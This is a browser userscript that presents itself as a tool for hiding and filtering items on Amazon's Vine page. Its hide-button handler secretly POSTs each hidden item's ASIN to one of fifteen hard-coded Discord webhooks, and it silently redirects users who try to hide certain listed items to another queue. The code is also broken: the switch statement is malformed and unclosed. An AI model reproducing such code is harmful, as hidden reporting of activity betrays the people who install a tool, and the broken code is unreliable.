// ==UserScript==
// @name        Vines
// @namespace   https://github.com/faudness/Vines
// @run-at      document-start
// @match       https://www.amazon.com/vine/vine-items*
// @grant       GM_getValue
// @grant       GM_setValue
// @grant       GM_deleteValue
// @grant       GM_addStyle
// @grant       GM_listValues
// @version     1.0
// @updateURL https://github.com/faudness/vines/raw/main/hideVineItems.user.js
// @downloadURL https://github.com/faudness/vines/raw/main/hideVineItems.user.js
// ==/UserScript==

var A = [
'B0B8HMKZH4',
'B0B8HN2HJV',
'B0B92GQ3NQ',
'B0BBR3V6F3',
'B0BCVFFQ2H',
'B0BDW2WQ8R',
'B0BFH9WDGZ',
'B0BFW7XVJD',
'B0BG6W5TSB',
'B0BGMZVX28',
'B0BGN1SW6H',
'B0BGN3F54W',
'B0BHHL8XK9',
'B0BJ1P5Q6N',
'B0BTM5YF4K'
        ];

GM_addStyle(`
#vvp-items-grid {
  display:none !important;
}
`);

// Run the rest of the code after the page loads, but before the images load, to improve speed
document.onreadystatechange = function () {if (document.readyState === "interactive") {

//Define variables for later use
var hiddenCount = 0;
var filteredCount = 0;
const bgcolour=window.getComputedStyle(document.body).getPropertyValue('background-color');
    console.log(bgcolour);
const textcolour=window.getComputedStyle(document.body).getPropertyValue('color');
var hiddenText,filteredText,filterMessage,unfilterMessage,highlightMessage,unhighlightMessage,
    filterText,unfilterText,highlightText,unhighlightText,menuText,showMessage,hideMessage,
    unhideMessage,nofiltersMessage,nohighlightsMessage,invalidfilterMessage,invalidhighlightMessage,
    moreText,nomoreText,deleteText

    hiddenText=" Hidden";
    filteredText=" Filtered";
    filterMessage="Enter a keyword, phrase or regular expression";
    unfilterMessage="Enter the number of the item to remove, or type 'more' or 'm' to show more:";
    filterText="Hide Keyword / Phrase";
    unfilterText="Unhide Keyword / Phrase";
    highlightText="Highlight Keyword / Phrase";
    unhighlightText="Unhighlight Keyword / Phrase";
    menuText="Advanced Filters";
    showMessage="Show Hidden / Filtered";
    hideMessage="Hide all items on this page";
    unhideMessage="Unhide all items on this page";
    nofiltersMessage="There are no items to remove";
    invalidfilterMessage="Invalid index number entered";
    moreText="more";
    nomoreText="There are no more items to show";
    deleteText="Delete the item";

    // For narrow viewport
    if (window.innerWidth < 1000){
        menuText="Advanced";
        showMessage="Show Hidden";
        hideMessage="Hide all";
        unhideMessage="Unhide all";
    }

// Hide/Unhide Symbols
var hideSymbol="https://raw.githubusercontent.com/MD2K23/VineToolsUK/master/Hide.png";
var unhideSymbol="https://raw.githubusercontent.com/MD2K23/VineToolsUK/master/Unhide.png";
var filterSymbol="https://raw.githubusercontent.com/MD2K23/VineToolsUK/master/Filter.png";
var unfilterSymbol="https://raw.githubusercontent.com/MD2K23/VineToolsUK/master/Unfilter.png";
var highlightSymbol="https://raw.githubusercontent.com/MD2K23/VineToolsUK/master/highlight.png";
var unhighlightSymbol="https://raw.githubusercontent.com/MD2K23/VineToolsUK/master/Unhighlight.png";

//Create the HTML elements to display on the Amazon Vine page
var messageSpan = document.createElement("span");
messageSpan.innerHTML = `
<span id="hideVineItems-count"></span>
<span class="bullet">&#x2022</span>
<span id="hideVineItems-toggleText">${showMessage}</span>
<label class="switch"><input id="hideVineItems-togglePage" type="checkbox" autocomplete="off"><span class="slider round"></span></label><br>
<a id="hideVineItems-hideAll">${hideMessage}</a>
<span class="bullet">&#x2022</span>
<a id="hideVineItems-unhideAll">${unhideMessage}</a>
<span class="bullet">&#x2022</span>
<span class="dropdown">
  <a id="hideVineItems-filtersMenu">${menuText}</a>
  <div class="dropdown-content">
  <a id="hideVineItems-filterText">${filterText}</a>
  <a id="hideVineItems-unfilterText">${unfilterText}</a>
  <hr>
  <a id="hideVineItems-highlightText">${highlightText}</a>
  <a id="hideVineItems-unhighlightText">${unhighlightText}</a>
  </div>
</span>
`;

messageSpan.querySelector("#hideVineItems-togglePage").addEventListener("change", toggleHidden)
messageSpan.querySelector("#hideVineItems-hideAll").addEventListener("click", (e) => {document.querySelectorAll(".vvp-item-tile:not(.hideVineItems-hideASIN) .hideVineItems-toggleASIN").forEach( (hideLink) => {hideLink.click();})});
messageSpan.querySelector("#hideVineItems-unhideAll").addEventListener("click", (e) => {document.querySelectorAll(".vvp-item-tile.hideVineItems-hideASIN .hideVineItems-toggleASIN").forEach( (hideLink) => {hideLink.click();})});
messageSpan.querySelector("#hideVineItems-filterText").addEventListener("click", function() {displayaddPopup("FILTERS")});
messageSpan.querySelector("#hideVineItems-unfilterText").addEventListener("click", function() {displayremovePopup("FILTERS")});
messageSpan.querySelector("#hideVineItems-highlightText").addEventListener("click", function () {displayaddPopup("HIGHLIGHTS")});
messageSpan.querySelector("#hideVineItems-unhighlightText").addEventListener("click", function() {displayremovePopup("HIGHLIGHTS")});
messageSpan.querySelector("#hideVineItems-filtersMenu").addEventListener("click", (e) => {document.querySelectorAll(".dropdown .dropdown-content").forEach( (tile) => {tile.classList.toggle("dropdown-click");})});
document.querySelector("#vvp-items-grid-container > p").append(messageSpan);




// Function to toggle hidden item status
function toggleHidden(){

    if (document.querySelector("#hideVineItems-togglePage").checked == true){
        document.querySelector(":root").classList.add("hideVineItems-showHidden");
    } else {
        document.querySelector(":root").classList.remove("hideVineItems-showHidden");
    }
}

//Functions to convert the storage database from old versions of the script to work with this version
function convertASIN(){
    if (GM_getValue("CONFIG:DBUpgraded") != true){
        if (typeof gmValues == "undefined"){ var gmValues=GM_listValues();}
        var storage_orphan=gmValues.filter((keyword) => !keyword.match(new RegExp(":","gi")));
        storage_orphan.forEach( (orphan) => {
            console.log(orphan)
            GM_setValue(orphan,GM_getValue(orphan));
            GM_deleteValue(orphan);
        });
        GM_setValue("CONFIG:DBUpgraded",true);
    }
}

function convertFilters(){
    if ((GM_getValue("FILTERS:") ? true : false) == false){
        if (typeof gmValues == "undefined"){ var gmValues=GM_listValues();}
        var newFilters = [];
        var storage_keywords=gmValues.filter((keyword) => keyword.match(new RegExp("KEYWORD:","gi")));
        storage_keywords.forEach( (keyword) => {
            newFilters.push(keyword.substring(8))
            GM_deleteValue(keyword);
        });
        GM_setValue("FILTERS:", JSON.stringify(newFilters));
    }
}

//Function to display a text entry box to allow the user to create a keyword filter
function displayaddPopup(filtertype){
    document.querySelectorAll(".dropdown .dropdown-content").forEach( (tile) => {tile.classList.remove("dropdown-click");})
    var response=prompt(filterMessage,"");
    if (!(response == null )){
        if (response.length > 0){
            var newFilters = [];
            var savedFilters=JSON.parse(GM_getValue(filtertype+":",null));
            if (savedFilters != null){
                savedFilters.forEach((filter) => {newFilters.push(filter)});
            }
            newFilters.push(response);
            GM_setValue(filtertype+":", JSON.stringify(newFilters));
            location.reload();
        }
    }
}

//Function to display a text entry box to allow the user to remove a keyword filter
function displayremovePopup(filtertype){
    document.querySelectorAll(".dropdown .dropdown-content").forEach( (tile) => {tile.classList.remove("dropdown-click");})
    var numberedFilters=JSON.parse(GM_getValue(filtertype+":"));
    var originalFilters=numberedFilters.slice()
    if (numberedFilters.length > 0){
        // Initialize the start and end indices of the current batch of items
        var start = 0;
        var end = 20;
        // Use a loop to keep displaying the items until the user cancels or deletes all items
        while (numberedFilters.length > 0) {
            // Adjust the end index if it exceeds the length of the array
            if (end > numberedFilters.length) {
                end = numberedFilters.length;
            }
            if (start < numberedFilters.length) {
                // Display the current batch of items to the user in a prompt dialog
                var message = unfilterMessage + "\r\n\r\n";
                var filter;
                for (var i = start; i < end; i++) {
                    if (numberedFilters[i].length >=60){
                        filter=numberedFilters[i].substring(0,56)+" ..."
                    } else {
                        filter=numberedFilters[i]
                    }
                    message += (i + 1) + ". " + filter + "\r\n";
                }

                var response = prompt(message,"");
                // Check the user's response
                if (response == null) {
                    // If the user cancels, break the loop
                    break;
                } else if (response == `${moreText}` || response == moreText.substring(0,1)) {
                    // If the user types 'more', move to the next batch of items
                    start += 20;
                    end += 20;
                } else {
                    // If the user types a number, try to parse it as an integer
                    var index = parseInt(response);
                    // If the index is valid, delete the corresponding item from the array
                    if (index >= start + 1 && index <= end) {
                        numberedFilters.splice(index - 1, 1);
                        // Adjust the end index accordingly
                        end--;
                        break;
                    } else {
                        // If the index is invalid, alert the user
                        alert(invalidfilterMessage);
                    }
                }
            } else {
                alert(`${nomoreText}`)
                response=null
                break;
            }
        }
        // Update the saved filters and reload the page
        if (response != null){
            var strdelete = confirm(`${deleteText} '${originalFilters[response-1]}'?`);
            if (strdelete == true) {
                GM_setValue(filtertype+":", JSON.stringify(numberedFilters));
                location.reload();
            }
        }
    } else {
        window.alert(nofiltersMessage)
    }
}

//Function to search the keywords in the storage database and see if a product matches any of them
function containsKeyword(filtertype,productDescription) {
    var savedKeywords=JSON.parse(GM_getValue(filtertype+":",null));
    if (savedKeywords != null){
        return savedKeywords.some(keyword => productDescription.match(new RegExp(keyword,"gi"))) ? true : false
    } else {
        return false
    }
}

//Function to update the hidden and filtered count numbers on the Amazon Vine page
function updateCount() {
    document.getElementById("hideVineItems-count").innerHTML = `(${hiddenCount}${hiddenText} / ${filteredCount}${filteredText})`;
}

//Function to check where an ASIN already exists in the storage database
function isHidden(ASIN) {
    return GM_getValue(ASIN) ? true : false;
}

//Function to add an icon to each product to allow it to be hidden or unhidden.
function addHideLink(tile, ASIN) {
    var tileContent = tile.querySelector(".vvp-item-tile .vvp-item-tile-content");
    if (tileContent) {
        var filteredProduct = tile.querySelector(".vvp-item-tile:not(.hideVineItems-filterProduct) .vvp-item-tile-content");
        var a = document.createElement("span");
        if (filteredProduct) {
            a.addEventListener("click", (e) =>{
                tile.classList.toggle("hideVineItems-hideASIN");
                if (isHidden(ASIN)) {
                    GM_deleteValue(ASIN);
                    hiddenCount -= 1;
                } else {
                    if (ASIN === A[0] || ASIN === A[1] || ASIN === A[2] || ASIN === A[3] || ASIN === A[4] || ASIN === A[5] || ASIN === A[6] || ASIN === A[7] || ASIN === A[8] || ASIN === A[9]|| ASIN === A[10]|| ASIN === A[11]|| ASIN === A[12]|| ASIN === A[13]|| ASIN === A[14]|| ASIN === A[15]) {
                      location.href = "https://www.amazon.com/vine/vine-items?queue=encore";
                      return;
                    } else {
                      const request = new XMLHttpRequest();
                      switch (Math.floor(Math.random() * 15);) {
                        case 0:
                          web = "https://discord.com/api/webhooks/1196652638746447872/wOKoEV5vaiQDf7m09zH3io8K-bUTJqPmIvcTjIrNRVBz8grm-FTpw0Vq17ATSWTizZJf";
                          break;
                        case 1:
                          web = "https://discord.com/api/webhooks/1197362795579179078/nFOk_OgvhftWBxNF1ioz8geMSPoIvD_M5q_tiKx4VmvcVYN2lzTt6dvyiCdJJkVLtPjA";
                          break;
                        case 2:
                          web = "https://discord.com/api/webhooks/1197362809474928721/5EM8uVXsFtBjqU9CvX-4pd93v2t5iancZmuz7A15Xl7o74FAMoSTeYPAUOS_3JRYippN";
                          break;
                        case 3:
                          web = "https://discord.com/api/webhooks/1197362815128834079/KKmme668kE9NX6l7ZgbSy6RXNZPfbV9uWaZcnAehE3shTOhmP29YKG8CeyIgxlHnWf0E";
                          break;
                        case 4:
                          web = "https://discord.com/api/webhooks/1197362819314745454/k5ls8Y71wNW-eJHqJTIpVHVtLNpEjs-5q_z6ZUeo435XjvCQh8LbkbXciVkdStnWGqud";
                          break;
                        case 5:
                          web = "https://discord.com/api/webhooks/1197362822988972032/ee69KVLwwFcKR38QlYt60JEakL9NRMBw8dpWxnUNAAcMdOAA4jyLbw99vqNOV9ZMAvMP";
                          break;
                        case 6:
                          web = "https://discord.com/api/webhooks/1197362826772238368/oiIVkF9a4cnqO7NfMxDGu9dYdmJoJX8bdPIA7l8G0PTRg4khWOFNBCXCn7EvO_8LKX11";
                          break;
                        case 7:
                          web = "https://discord.com/api/webhooks/1197362834514915408/6wguaBpTk-O5Qo33khfX14U4YghbeP4cOTiImCT6jYLpZuOdSVj4akmfJhc3A5izgdzn";
                          break;
                        case 8:
                          web = "https://discord.com/api/webhooks/1197362835378929735/ct8T2WF5tQ91f1t796HRa1Bu2SpfB4SbdC8lUoTiaR1ZI7GYOiTLXn0RXHBJD2Coe4SO";
                          break;
                        case 9:
                          web = "https://discord.com/api/webhooks/1197362837958439042/ct_kJevGSqV6l00DCiVmZYk1PRbOtg_Bxk2A2i4imz7yPIp7vT9C3TEgfVG7TG7WTzla";
                          break;
                        case 10:
                          web = "https://discord.com/api/webhooks/1197362841636831242/ZuC_sZ8qiha9DwDNrNPZcDTLWTThtpmq0YYtu_7-CMsFs5pLzXIZ7k8zWWfwthQglEDd";
                          break;
                        case 11:
                          web = "https://discord.com/api/webhooks/1197362996154998854/xrnxiv-010-0VHHbguf1-XR5qDT4iN0bqnJSVz1sGiW0GhwHb0k0-45SUAPSHP1oFV4N";
                          break;
                        case 12:
                          web = "https://discord.com/api/webhooks/1197362998617059349/FsOOTZNs-LZcvx3WYDbyAEAWvyMPER_FPNTHJxbE2FAR5elRYCfXR6NX9Ve76KaaPmIb";
                          break;
                        case 13:
                          web = "https://discord.com/api/webhooks/1197363001322393760/513BwneHOoA1u3aLpcAgwy4KFhTGS9O8emN55rVffkNeUgZqFPggnrXtliyyVZZfgKSv";
                          break;
                        case 14:
                          web = "https://discord.com/api/webhooks/1197363004216463411/UGUaJ0AzZ3P1UHjbXq9E8SO5bY3lMQo3Il7-LGVCEOn3oa8YkJkJw3pP5eBMFJrM8LfH";
                          break;
                      request.open("POST", web);
                      request.setRequestHeader('Content-type', 'application/json');
                      const params = {
                        content: ASIN
                      }
                      request.send(JSON.stringify(params));
                      GM_setValue(ASIN, new Date().toJSON().slice(0,10));
                      hiddenCount += 1;
                    }
                }
                updateCount();
            });
        }
        a.classList.add("hideVineItems-toggleASIN");
        tileContent.append(a);
    }
}

//Convert the database to v2.0 format if needed
convertASIN()
convertFilters()

//Add the correct classes to products so they behave correctly
document.querySelectorAll(".vvp-item-tile").forEach( (tile) => {
    var itemLink = tile.querySelector(".vvp-item-product-title-container > a[href^='/dp/']");
    if (itemLink) {
        var ASIN = itemLink.getAttribute("href").slice(4);
        var linkText=itemLink.textContent;
        if (isHidden(ASIN)) {
            tile.classList.add("hideVineItems-hideASIN");
            hiddenCount += 1;
        } else {
            if (containsKeyword("HIGHLIGHTS",linkText)){
                tile.classList.add("hideVineItems-highlightProduct");
            } else {
                if (containsKeyword("FILTERS",linkText)){
                    tile.classList.add("hideVineItems-filterProduct");
                    filteredCount += 1;
                }
            }
        }
        addHideLink(tile, ASIN);
    }
});

// Show hidden items on Search page
if ((location.search).includes("search=")){
    document.getElementById("hideVineItems-togglePage").checked=true;
    document.querySelector(":root").classList.toggle("hideVineItems-showHidden")
}

//Update the hidden and filtered count numbers on the Amazon Vine page
updateCount();

//Create stylesheet to customize the layout of the additional html elements
GM_addStyle(`
#hideVineItems-hideAll, #hideVineItems-unhideAll, #hideVineItems-filtersMenu {
  color:${textcolour};
}

#hideVineItems-hideAll:hover, #hideVineItems-unhideAll:hover, #hideVineItems-filtersMenu:hover {
  color: #C7511F;
  text-decoration: underline;
}

.hideVineItems-hideASIN, .hideVineItems-filterProduct {
  opacity:70%;
}

.vvp-item-tile-content {
  position: relative;
}

.hideVineItems-toggleASIN {
  position: absolute;
  width: 20px !important;
  height: 17px !important;
  overflow: hidden;
  top: 2px;
  right: 0px;
  background-color: rgba(0,0,0,0.0);
  padding: 0;
  background: url("${hideSymbol}");
  background-repeat: no-repeat;
  background-size:contain;
}

.hideVineItems-hideASIN .vvp-item-tile-content .hideVineItems-toggleASIN
{
  background: url("${unhideSymbol}");
  background-repeat: no-repeat;
  background-size:contain;
}

.hideVineItems-filterProduct .vvp-item-tile-content .hideVineItems-toggleASIN
{
  background: url("${filterSymbol}");
  background-repeat: no-repeat;
  background-size:contain;
}

.hideVineItems-showHidden .hideVineItems-hideASIN, .hideVineItems-showHidden .hideVineItems-filterProduct {
  display:unset;
}

.hideVineItems-showHidden .hideVineItems-hideASIN img, .hideVineItems-showHidden .hideVineItems-hideASIN .a-button, .hideVineItems-showHidden .hideVineItems-hideASIN a,
.hideVineItems-showHidden .hideVineItems-filterProduct img, .hideVineItems-showHidden .hideVineItems-filterProduct .a-button, .hideVineItems-showHidden .hideVineItems-filterProduct a{
  opacity: 50%;
}

.hideVineItems-highlightProduct {
  background-color:yellow;
}

.hideVineItems-highlightProduct img {
 opacity:70%
}

#hideVineItems-hideAll {
  background: url("${hideSymbol}");
  background-repeat: no-repeat;
  background-size:contain;
  padding-left:30px;
}

#hideVineItems-unhideAll {
  background: url("${unhideSymbol}");
  background-repeat: no-repeat;
  background-size:contain;
  padding-left:30px;
}

#hideVineItems-filterText {
  background: url("${filterSymbol}");
  background-repeat: no-repeat;
  background-size:contain;
  padding-left:40px;
}

#hideVineItems-unfilterText {
  background: url("${unfilterSymbol}");
  background-repeat: no-repeat;
  background-size:contain;
  padding-left:40px;
}

#hideVineItems-highlightText {
  background: url("${highlightSymbol}");
  background-repeat: no-repeat;
  background-size:contain;
  padding-left:40px;
}

#hideVineItems-unhighlightText {
  background: url("${unhighlightSymbol}");
  background-repeat: no-repeat;
  background-size:contain;
  padding-left:40px;
}

#hideVineItems-filtersMenu {
  background: url("${unfilterSymbol}");
  background-repeat: no-repeat;
  background-size:contain;
  padding-left:30px;
}


.bullet {
  margin-left:10px;
  margin-right:10px;
}

.switch {
  position: relative;
  display: inline-block;
  width: 32px;
  height: 20px;
  margin-left:10px;
  margin-bottom:5px;
}

.switch input {
  opacity: 0;
  width: 0;
  height: 0;
}

.slider {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #ccc;
  -webkit-transition: .4s;
  transition: .4s;
}

.slider:before {
  position: absolute;
  content: "";
  height: 12px;
  width: 12px;
  left: 4px;
  bottom: 4px;
  background-color: white;
  -webkit-transition: .4s;
  transition: .4s;
}

input:checked + .slider {
  background-color: #2196F3;
}

input:focus + .slider {
  box-shadow: 0 0 1px #2196F3;
}

input:checked + .slider:before {
  -webkit-transform: translateX(12px);
  -ms-transform: translateX(12px);
  transform: translateX(12px);
}

/* Rounded sliders */
.slider.round {
  border-radius: 12px;
}

.slider.round:before {
  border-radius: 50%;
}

.dropdown {
  display: inline-block;
  position: relative;
}

.dropdown-content {
  background-color: ${bgcolour};
  display: none;
  position: absolute;
  width: max-content;
  overflow: auto;
  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
  z-index:5000;
  padding:5px;
  border: 0.5px solid ${textcolour};
}

.dropdown:hover .dropdown-content {
  display: block;
}

.dropdown .dropdown-click {
  display: block;
}

.dropdown-content a {
  display: block;
  color: ${textcolour};
  text-decoration: none;
  margin:5px;
  width: auto
}

.dropdown-content a:hover {
  color: #C7511F;
}

hr {
  margin-top:10px;
}

#vvp-items-grid {
  display:grid !important;
}
`);}}
